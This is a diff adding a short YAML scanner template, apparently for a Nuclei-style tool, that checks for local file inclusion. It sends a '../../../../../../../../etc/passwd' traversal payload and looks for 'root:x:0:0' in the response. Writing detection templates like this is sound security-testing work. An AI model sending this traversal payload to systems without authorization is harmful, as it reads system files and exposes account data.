@@ -1,0 +1,20 @@
+id: lfi7-087
+name: 'Deep traversal in resource'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via resource'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      resource:
+        - '../../../../../../../../etc/passwd'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
